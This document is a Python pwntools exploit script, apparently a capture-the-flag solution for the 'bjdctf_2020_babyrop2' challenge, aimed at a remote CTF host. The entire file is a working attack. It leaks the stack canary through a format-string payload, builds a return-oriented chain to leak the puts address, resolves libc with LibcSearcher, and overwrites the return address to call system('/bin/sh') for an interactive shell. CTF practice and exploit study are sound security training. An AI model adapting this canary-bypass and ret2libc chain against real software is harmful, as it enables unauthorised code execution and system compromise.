from pwn import *

context(log_level='debug')

#io=process("./bjdctf_2020_babyrop2")
io=remote("node3.buuoj.cn",29159)
elf=ELF("./bjdctf_2020_babyrop2")

io.recv()

io.sendline(str('%7$p'))

canary=int(io.recvuntil(b'\n',drop=True),16)
print(hex(canary))

io.recv()
# format_string 偏移为6 canary (0x10-0x8)/8+6=7

vuln=0x400887

pop_rdi_ret=0x400993

ret=0x4005f9

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']

payload=b'A'*(0x20-0x8)+p64(canary)+b'B'*8+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)

io.sendline(payload)
puts_addr=u64(io.recvuntil(b'\n',drop=True).ljust(8,b'\x00'))

print(hex(puts_addr))
io.recv()



from LibcSearcher import *  

libc = LibcSearcher('puts',puts_addr)  
#获取libc加载地址  
libc_base = puts_addr - libc.dump('puts')  
#获取system地址  
system_addr = libc_base + libc.dump('system')  
#获取/bin/sh地址  
binsh_addr = libc_base + libc.dump('str_bin_sh')  


payload=b'A'*(0x20-0x8)+p64(canary)+b'B'*8+p64(ret)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)

io.sendline(payload)

io.interactive()